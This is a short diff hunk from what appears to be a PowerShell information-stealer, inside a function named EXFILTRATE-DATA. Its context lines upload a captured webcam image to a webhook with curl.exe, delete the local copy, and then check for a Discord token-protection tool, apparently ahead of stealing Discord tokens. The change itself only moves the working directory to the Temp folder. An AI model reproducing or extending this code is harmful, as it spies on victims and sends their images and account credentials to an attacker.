@@ -949,6 +949,8 @@ function EXFILTRATE-DATA {
         curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
         Remove-Item -Path "$folder_general\$name" -Force
     }
+	
+    Set-Location "$env:LOCALAPPDATA\Temp"
 
     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
     if ($token_prot -eq $true) {
